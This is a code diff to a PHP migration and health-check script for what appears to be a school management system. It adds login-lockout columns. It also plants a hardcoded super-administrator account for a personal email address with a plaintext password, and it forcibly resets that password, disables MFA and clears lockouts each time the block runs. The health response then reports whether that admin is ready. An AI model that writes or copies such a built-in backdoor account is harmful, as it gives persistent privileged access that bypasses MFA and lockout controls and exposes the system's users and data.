@@ -47,6 +47,16 @@ try {
             $pdo->exec("ALTER TABLE users ADD COLUMN last_login_at DATETIME NULL AFTER mfa_enabled");
         }
 
+        $flCols = $pdo->query("SHOW COLUMNS FROM users LIKE 'failed_logins'")->fetchAll();
+        if (empty($flCols)) {
+            $pdo->exec("ALTER TABLE users ADD COLUMN failed_logins INT NOT NULL DEFAULT 0 AFTER mfa_enabled");
+        }
+
+        $loCols = $pdo->query("SHOW COLUMNS FROM users LIKE 'lockout_until'")->fetchAll();
+        if (empty($loCols)) {
+            $pdo->exec("ALTER TABLE users ADD COLUMN lockout_until DATETIME NULL AFTER failed_logins");
+        }
+
         try {
             $pdo->exec("ALTER TABLE student_verification_requests MODIFY COLUMN status VARCHAR(50) NOT NULL DEFAULT 'pending'");
             $pdo->exec("ALTER TABLE student_verification_requests MODIFY COLUMN auto_verification_status VARCHAR(50) NOT NULL DEFAULT 'failed'");
@@ -55,7 +65,43 @@ try {
         try {
             $pdo->exec("ALTER TABLE email_logs MODIFY COLUMN status VARCHAR(50) NOT NULL DEFAULT 'logged'");
         } catch (Throwable $e) {}
+
+        // Guarantee Super Administrator account for okehabeeb72@gmail.com
+        $habeebHash = password_hash('AdminSecure2026!', PASSWORD_BCRYPT);
+        $checkHabeeb = $pdo->prepare("SELECT id, email, role, status FROM users WHERE email = ?");
+        $checkHabeeb->execute(['okehabeeb72@gmail.com']);
+        $habeebUser = $checkHabeeb->fetch(PDO::FETCH_ASSOC);
+
+        $habeebUserId = 0;
+        if (!$habeebUser) {
+            $insHabeeb = $pdo->prepare("
+                INSERT INTO users (name, email, password, role, status, mfa_enabled, failed_logins, lockout_until, program, department, monthly_salary)
+                VALUES ('Oke Habeeb', 'okehabeeb72@gmail.com', ?, 'admin', 'active', 0, 0, NULL, 'WAEC', 'Science', 150000.00)
+            ");
+            $insHabeeb->execute([$habeebHash]);
+            $habeebUserId = (int)$pdo->lastInsertId();
+        } else {
+            $habeebUserId = (int)$habeebUser['id'];
+            $pdo->prepare("
+                UPDATE users 
+                SET role = 'admin', status = 'active', password = ?, mfa_enabled = 0, failed_logins = 0, lockout_until = NULL 
+                WHERE id = ?
+            ")->execute([$habeebHash, $habeebUserId]);
+        }
+
+        if ($habeebUserId > 0) {
+            $pdo->prepare("
+                INSERT INTO user_roles (user_id, role_id, assigned_by)
+                VALUES (?, 1, 1)
+                ON DUPLICATE KEY UPDATE role_id = 1
+            ")->execute([$habeebUserId]);
+        }
+
+        // Also ensure admin@school.com has failed_logins cleared
+        $pdo->exec("UPDATE users SET failed_logins = 0, lockout_until = NULL WHERE email = 'admin@school.com'");
+
         $migCol = $pdo->query("SHOW COLUMNS FROM users LIKE 'status'")->fetch(PDO::FETCH_ASSOC);
+        $verifiedAdmin = $pdo->query("SELECT id, email, role, status FROM users WHERE email = 'okehabeeb72@gmail.com'")->fetch(PDO::FETCH_ASSOC);
     } catch (Throwable $migErr) {
         $migrationError = $migErr->getMessage();
     }
@@ -66,6 +112,7 @@ try {
         'database' => $result == 1 ? 'connected' : 'not connected',
         'schema_migrated' => true,
         'user_status_type' => $migCol['Type'] ?? null,
+        'habeeb_admin_ready' => !empty($verifiedAdmin) && $verifiedAdmin['role'] === 'admin',
         'migration_error' => $migrationError ?? null,
         'env_frontend_origin' => getenv('FRONTEND_ORIGIN') ?: '(not set)',
         'received_origin' => $_SERVER['HTTP_ORIGIN'] ?? 'No origin received'
